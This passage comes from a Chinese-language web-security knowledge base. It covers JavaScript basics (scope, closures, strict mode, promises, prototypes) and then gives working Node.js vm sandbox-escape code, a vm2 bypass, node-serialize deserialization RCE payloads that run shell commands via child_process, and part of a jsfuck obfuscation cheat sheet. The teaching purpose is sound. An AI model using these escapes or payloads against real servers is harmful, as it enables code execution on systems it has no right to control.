<li>保护用户免受由于无意的错误而导致漏洞的应用程序的侵害</li>
<li>保护用户免受故意编写为恶意的应用程序的侵害</li>
<li>为开发人员提供良好的缓解措施</li>
</ul>
<p>具体的安全措施有</p>
<ul class="simple">
<li>Wasm应用程序在沙箱内运行</li>
<li>Wasm无法对任意地址进行函数调用。Wasm采用对函数进行编号的方式，编号存储在函数表中</li>
<li>间接函数调用受类型签名检查的约束</li>
<li>调用堆栈受到保护，这意味着无法覆盖返回指针</li>
<li>实现了控制流完整性，这意味着调用意外的函数将失败</li>
</ul>
</div>
</div>
<span id="document-language/javascript/scope"></span><div class="section" id="id1">
<h4>作用域与闭包<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>作用域与作用域链<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<div class="section" id="id3">
<h6>作用域<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<p>简单来说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期。JavaScript的作用域是靠函数来形成的，也就是说一个函数的变量在函数外不可以访问。</p>
<p>作用域可以分为全局作用域、局部作用域和块级作用域，其中全局作用域主要有以下三种情况：</p>
<ul class="simple">
<li>函数外面定义的变量拥有全局作用域</li>
<li>未定义直接赋值的变量自动声明为拥有全局作用域</li>
<li>window对象的属性拥有全局作用</li>
</ul>
<p>局部作用域一般只在固定的代码片段内可访问到，最常见的例如函数内部，所以也会把这种作用域称为函数作用域。</p>
</div>
<div class="section" id="id4">
<h6>作用域泄漏<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<p>在ES5标准时，只有全局作用域和局部作用域，没有块级作用域，这样可能会造成变量泄漏的问题。例如：</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="kd">function</span> <span class="nx">f</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">f</span><span class="p">();</span> <span class="c1">// undefined</span>
</pre></div>
</div>
</div>
<div class="section" id="var-hoisting">
<h6>作用域提升（var Hoisting）<a class="headerlink" href="#var-hoisting" title="永久链接至标题">¶</a></h6>
<p>在JavaScript中，使用var在函数或全局内任何地方声明变量相当于在其内部最顶上声明它，这种行为称为Hoisting。例如下面这段代码等效于第二段代码</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span> <span class="c1">// =&gt; undefined</span>
    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span> <span class="c1">// =&gt; 1</span>
<span class="p">}</span>
<span class="nx">foo</span><span class="p">();</span>
</pre></div>
</div>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">x</span><span class="p">;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span> <span class="c1">// =&gt; undefined</span>
    <span class="nx">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span> <span class="c1">// =&gt; 1</span>
<span class="p">}</span>
<span class="nx">foo</span><span class="p">();</span>
</pre></div>
</div>
</div>
<div class="section" id="id5">
<h6>作用域链<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<p>当函数被执行时，总是先从函数内部找寻局部变量，如果找不到相应的变量，则会向创建函数的上级作用域寻找，直到找到全局作用域为止，这个过程被称为作用域链。</p>
</div>
</div>
<div class="section" id="id6">
<h5>闭包<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>函数与对其状态即词法环境（lexical environment）的引用共同构成闭包（closure）。也就是说，闭包可以让你从内部函数访问外部函数作用域。在JavaScript，函数在每次创建时生成闭包。</p>
<p>在JavaScript中，并没有原生的对private方法的支持，即一个元素/方法只能被同一个类中的其它方法所调用。而闭包则是一种可以被用于模拟私有方法的方案。另外闭包也提供了管理全局命名空间的能力，避免非核心的方法或属性污染了代码的公共接口部分。下面是一个简单的例子：</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">Counter</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">privateCounter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">function</span> <span class="nx">changeBy</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">privateCounter</span> <span class="o">+=</span> <span class="nx">val</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="p">{</span>
    <span class="nx">increment</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">changeBy</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">},</span>
    <span class="nx">decrement</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">changeBy</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">},</span>
    <span class="nx">value</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">privateCounter</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">})();</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Counter</span><span class="p">.</span><span class="nx">value</span><span class="p">());</span> <span class="cm">/* logs 0 */</span>
<span class="nx">Counter</span><span class="p">.</span><span class="nx">increment</span><span class="p">();</span>
<span class="nx">Counter</span><span class="p">.</span><span class="nx">increment</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Counter</span><span class="p">.</span><span class="nx">value</span><span class="p">());</span> <span class="cm">/* logs 2 */</span>
<span class="nx">Counter</span><span class="p">.</span><span class="nx">decrement</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Counter</span><span class="p">.</span><span class="nx">value</span><span class="p">());</span> <span class="cm">/* logs 1 */</span>
</pre></div>
</div>
</div>
<div class="section" id="id7">
<h5>全局对象<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>全局对象是一个特殊的对象，它的作用域是全局的。</p>
<p>全平台可用的全局对象是 <code class="docutils literal notranslate"><span class="pre">globalThis</span></code> ，它跟全局作用域里的this值相同。另外在浏览器中存在 <code class="docutils literal notranslate"><span class="pre">self</span></code> 和 <code class="docutils literal notranslate"><span class="pre">window</span></code> 全局对象，Web Workers中存在 <code class="docutils literal notranslate"><span class="pre">self</span></code> 全局对象，Node.js 中存在 <code class="docutils literal notranslate"><span class="pre">global</span></code> 全局对象。</p>
</div>
</div>
<span id="document-language/javascript/strict"></span><div class="section" id="id1">
<h4>严格模式<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>在ES5中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离“马虎模式/稀松模式/懒散模式“（sloppy）模式在更严格的条件下运行。严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义。</p>
<p>引入严格模式的目的主要是：</p>
<ul class="simple">
<li>通过抛出错误来消除了一些原有静默错误</li>
<li>消除JavaScript语法的一些不合理、不严谨之处，减少一些怪异行为</li>
<li>消除代码运行的一些不安全之处，保证代码运行的安全</li>
<li>修复了一些导致 JavaScript引擎难以执行优化的缺陷，提高编译器效率，增加运行速度</li>
<li>禁用了在ECMAScript的未来版本中可能会定义的一些语法，为未来新版本的JavaScript做铺垫</li>
</ul>
</div>
<div class="section" id="id3">
<h5>调用<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>严格模式使用 <code class="docutils literal notranslate"><span class="pre">&quot;use</span> <span class="pre">strict&quot;;</span></code> 字符串开启。对整个脚本文件而言，可以将 <code class="docutils literal notranslate"><span class="pre">&quot;use</span> <span class="pre">strict&quot;</span></code> 放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。</p>
<p>对单个函数而言，将 <code class="docutils literal notranslate"><span class="pre">&quot;use</span> <span class="pre">strict&quot;</span></code> 放在函数体的第一行，则整个函数以严格模式运行。</p>
</div>
<div class="section" id="id4">
<h5>行为改变<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>在严格模式中，主要有以下的行为更改：</p>
<div class="section" id="id5">
<h6>全局变量显式声明<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<p>在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="s2">&quot;use strict&quot;</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// ReferenceError: i is not defined</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="with">
<h6>禁止使用with语句<a class="headerlink" href="#with" title="永久链接至标题">¶</a></h6>
<p>with语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。</p>
</div>
<div class="section" id="eval">
<h6>创设eval作用域<a class="headerlink" href="#eval" title="永久链接至标题">¶</a></h6>
<p>正常模式下，eval语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于eval内部。</p>
</div>
<div class="section" id="id6">
<h6>禁止删除变量<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h6>
<p>严格模式下无法删除变量。只有configurable设置为true的对象属性，才能被删除。</p>
</div>
<div class="section" id="id7">
<h6>显式报错<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h6>
<p>正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：</p>
<ul class="simple">
<li>对一个对象的只读属性进行赋值</li>
<li>对一个使用getter方法读取的属性进行赋值</li>
<li>对禁止扩展的对象添加新属性</li>
<li>删除一个不可删除的属性</li>
</ul>
</div>
<div class="section" id="id8">
<h6>语法错误<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h6>
<p>严格模式新增了一些语法错误，包括：</p>
<ul class="simple">
<li>对象不能有重名的属性</li>
<li>函数不能有重名的参数</li>
<li>禁止八进制表示法</li>
<li>函数必须声明在顶层</li>
<li><dl class="first docutils">
<dt>新增保留字</dt>
<dd><ul class="first last">
<li>class</li>
<li>enum</li>
<li>export</li>
<li>extends</li>
<li>import</li>
<li>super</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id9">
<h6>安全增强<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>禁止this关键字指向全局对象</li>
<li>禁止在函数内部遍历调用栈</li>
</ul>
</div>
<div class="section" id="arguments">
<h6>限制arguments对象<a class="headerlink" href="#arguments" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>不允许对arguments赋值</li>
<li>arguments不再追踪参数的变化</li>
<li>禁止使用arguments.callee</li>
</ul>
</div>
</div>
</div>
<span id="document-language/javascript/async"></span><div class="section" id="id1">
<h4>异步机制<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="async-await">
<h5>async / await<a class="headerlink" href="#async-await" title="永久链接至标题">¶</a></h5>
<p>async function 关键字用来在表达式中定义异步函数。</p>
</div>
<div class="section" id="promise">
<h5>Promise<a class="headerlink" href="#promise" title="永久链接至标题">¶</a></h5>
<p>Promise 对象是一个代理对象（代理一个值），被代理的值在Promise对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。 这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的promise对象</p>
<p>一个 Promise有以下几种状态:</p>
<ul class="simple">
<li>pending: 初始状态，既不是成功，也不是失败状态。</li>
<li>fulfilled: 意味着操作成功完成。</li>
<li>rejected: 意味着操作失败。</li>
</ul>
<p>pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当Promise状态为fulfilled时，调用 then 的 onfulfilled 方法，当Promise状态为rejected时，调用 then 的 onrejected 方法， 所以在异步操作的完成和绑定处理方法之间不存在竞争）。</p>
<p>因为 Promise.prototype.then 和  Promise.prototype.catch 方法返回promise 对象， 所以它们可以被链式调用。</p>
</div>
<div class="section" id="id2">
<h5>执行队列<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>JavaScript中的异步运行机制如下：</p>
<ul class="simple">
<li>所有同步任务都在主线程上执行，形成一个执行栈</li>
<li>主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。</li>
<li>一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。</li>
<li>主线程不断重复上面的第三步。</li>
</ul>
<p>其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为DOM事件、时间回调、网络回调三种：</p>
<ul class="simple">
<li>DOM事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。</li>
<li>时间回调：setTimeout / setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。</li>
<li>网络回调：ajax / fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。</li>
</ul>
</div>
</div>
<span id="document-language/javascript/prototype"></span><div class="section" id="id1">
<h4>原型链<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>显式原型和隐式原型<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>JavaScript的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。</p>
<p>其中显式原型指prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性</p>
<p>隐式原型指JavaScript中任意对象都有的内置属性prototype。在ES5之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过 <code class="docutils literal notranslate"><span class="pre">__proto__</span></code> 来访问。ES5中有了对于这个内置属性标准的Get方法 <code class="docutils literal notranslate"><span class="pre">Object.getPrototypeOf()</span></code> 。</p>
<p>隐式原型指向创建这个对象的函数(constructor)的prototype， <code class="docutils literal notranslate"><span class="pre">__proto__</span></code> 指向的是当前对象的原型对象，而prototype指向的，是以当前函数作为构造函数构造出来的对象的原型对象。</p>
<p>显式原型的作用用来实现基于原型的继承与属性的共享。
隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问obj这个对象中的x属性时，如果在obj中找不到，那么就会沿着 <code class="docutils literal notranslate"><span class="pre">__proto__</span></code> 依次查找。</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Note: Object.prototype 这个对象是个例外，它的__proto__值为null
</pre></div>
</div>
</div>
<div class="section" id="new">
<h5>new 的过程<a class="headerlink" href="#new" title="永久链接至标题">¶</a></h5>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">Person</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){};</span>
<span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Person</span><span class="p">();</span>
</pre></div>
</div>
<p>new的过程拆分成以下三步：
- <code class="docutils literal notranslate"><span class="pre">var</span> <span class="pre">p={};</span></code> 初始化一个对象p
- <code class="docutils literal notranslate"><span class="pre">p.__proto__</span> <span class="pre">=</span> <span class="pre">Person.prototype;</span></code>
- <code class="docutils literal notranslate"><span class="pre">Person.call(p);</span></code> 构造p，也可以称之为初始化p</p>
<p>关键在于第二步，我们来证明一下：</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">Person</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){};</span>
<span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Person</span><span class="p">();</span>
<span class="nx">alert</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">===</span> <span class="nx">Person</span><span class="p">.</span><span class="nx">prototype</span><span class="p">);</span>
</pre></div>
</div>
<p>这段代码会返回true。说明我们步骤2是正确的。</p>
</div>
<div class="section" id="id3">
<h5>示例<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">Person</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){};</span>
<span class="nx">Person</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">sayName</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;My Name is Jacky&quot;</span><span class="p">);</span>
<span class="p">};</span>

<span class="nx">Person</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">age</span> <span class="o">=</span> <span class="mi">27</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Person</span><span class="p">();</span>
<span class="nx">p</span><span class="p">.</span><span class="nx">sayName</span><span class="p">();</span>
</pre></div>
</div>
<p>p是一个引用指向Person的对象。我们在Person的原型上定义了一个sayName方法和age属性，当我们执行p.age时，会先在this的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。</p>
<p>这里的向上追溯是怎么向上的呢？这里就要使用 <code class="docutils literal notranslate"><span class="pre">__proto__</span></code> 属性来链接到原型（也就是Person.prototype）进行查找。最终在原型上找到了age属性。</p>
</div>
<div class="section" id="id4">
<h5>原型链污染<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>如前文提到的，JavaScript是动态继承，通过 <code class="docutils literal notranslate"><span class="pre">__proto__</span></code> 修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。</p>
</div>
</div>
<span id="document-language/javascript/vm"></span><div class="section" id="id1">
<h4>沙箱逃逸<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>前端沙箱<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>在前端中，可能会使用删除 <code class="docutils literal notranslate"><span class="pre">eval</span></code> ，重写 <code class="docutils literal notranslate"><span class="pre">Function.prototype.constructor</span></code> / <code class="docutils literal notranslate"><span class="pre">GeneratorFunction</span></code> / <code class="docutils literal notranslate"><span class="pre">AsyncFunction</span></code> 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新iframe的方式来获取新的执行环境。</p>
</div>
<div class="section" id="id3">
<h5>服务端沙箱<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>JavaScript提供了原生的vm模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的JavaScript API和全局的NodeJS环境。</p>
<p>在原生的沙箱模块中，常用的逃逸方式为：</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{};</span>
<span class="kr">const</span> <span class="nx">whatIsThis</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`</span>
<span class="sb">    const ForeignObject = this.constructor;</span>
<span class="sb">    const ForeignFunction = ForeignObject.constructor;</span>
<span class="sb">    const process = ForeignFunction(&quot;return process&quot;)();</span>
<span class="sb">    const require = process.mainModule.require;</span>
<span class="sb">    require(&quot;fs&quot;);</span>
<span class="sb">`</span><span class="p">,</span> <span class="nx">sandbox</span><span class="p">);</span>
</pre></div>
</div>
<p>考虑到JavaScript原生vm模块的缺陷，有开发者设计了vm2来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span>
  <span class="s1">&#39;Promise.resolve().then(()=&gt;{while(1)console.log(&quot;foo&quot;, Date.now());}); while(1)console.log(Date.now())&#39;</span><span class="p">,</span>
  <span class="p">{</span><span class="nx">console</span><span class="o">:</span><span class="p">{</span><span class="nx">log</span><span class="p">(){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">console</span><span class="p">,</span><span class="nx">arguments</span><span class="p">);}}},</span>
  <span class="p">{</span><span class="nx">timeout</span><span class="o">:</span><span class="mi">5</span><span class="p">}</span>
<span class="p">);</span>
</pre></div>
</div>
</div>
</div>
<span id="document-language/javascript/deserialization"></span><div class="section" id="id1">
<h4>反序列化<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>JavaScript本身并没有反序列化的实现，但是一些库如node-serialize、serialize-to-js等支持了反序列化功能。这些库通常使用JSON形式来存储数据，但是和原生函数JSON.parse、 JSON.stringify不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。</p>
</div>
<div class="section" id="payload">
<h5>Payload构造<a class="headerlink" href="#payload" title="永久链接至标题">¶</a></h5>
<p>下面是一个最简单的例子，首先获得序列化后的输出</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">{</span>
 <span class="nx">rce</span> <span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
 <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span> <span class="p">});</span>
 <span class="p">},</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-serialize&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Serialized: \n&quot;</span> <span class="o">+</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">serialize</span><span class="p">(</span><span class="nx">y</span><span class="p">));</span>
</pre></div>
</div>
<p>上面执行后会返回</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="s2">&quot;rce&quot;</span><span class="o">:</span><span class="s2">&quot;_$$ND_FUNC$$_function (){require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) });}&quot;</span><span class="p">}</span>
</pre></div>
</div>
<p>不过这段payload反序列化后并不会执行，但是在JS中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如 <code class="docutils literal notranslate"><span class="pre">(function</span> <span class="pre">()</span> <span class="pre">{</span> <span class="pre">/*</span> <span class="pre">code</span> <span class="pre">*/</span> <span class="pre">}</span> <span class="pre">());</span></code> 这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的payload测试如下:</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-serialize&#39;</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s1">&#39;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function (){require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) { console.log(stdout) });}()&quot;}&#39;</span><span class="p">;</span>
<span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span>
</pre></div>
</div>
</div>
<div class="section" id="payload-ii">
<h5>Payload构造 II<a class="headerlink" href="#payload-ii" title="永久链接至标题">¶</a></h5>
<p>以上提到的是node-serialize这类反序列化库的构造方式，还有一类库如funcster，是使用直接拼接字符串构造函数的方式来执行。</p>
<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="k">return</span> <span class="s2">&quot;module.exports=(function(module,exports){return{&quot;</span> <span class="o">+</span> <span class="nx">entries</span> <span class="o">+</span> <span class="s2">&quot;};})();&quot;</span><span class="p">;</span>
</pre></div>
</div>
<p>这种方式可以使用相应的闭合来构造payload。</p>
</div>
</div>
<span id="document-language/javascript/jsfuck"></span><div class="section" id="jsfuck-cheat-sheet">
<h4>jsfuck cheat sheet<a class="headerlink" href="#jsfuck-cheat-sheet" title="永久链接至标题">¶</a></h4>
<div class="section" id="basic-values">
<h5>Basic values<a class="headerlink" href="#basic-values" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">undefined</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[][[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">false</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">![]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">true</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">!![]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">NaN</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">+[![]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">0</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">+[]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">1</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">+!+[]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">2</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">!+[]+!+[]</span></code></li>
</ul>
</div>
<div class="section" id="basic-strings">
<h5>Basic strings<a class="headerlink" href="#basic-strings" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">''</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+[]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'undefined'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+[][[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'false'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+![]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'true'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+!![]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'NaN'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+(+[![]])</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'0'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+(+[])</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'1'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+(+!+[])</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'2'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[]+(!+[]+!+[])</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'10'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[+!+[]]+[+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'11'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[+!+[]]+[+!+[]]</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">'100'</span></code> &gt; <code class="docutils literal notranslate"><span class="pre">[+!+[]]+[+[]]+(+[])</span></code></li>
</ul>
</div>
<div class="section" id="higher-numbers">
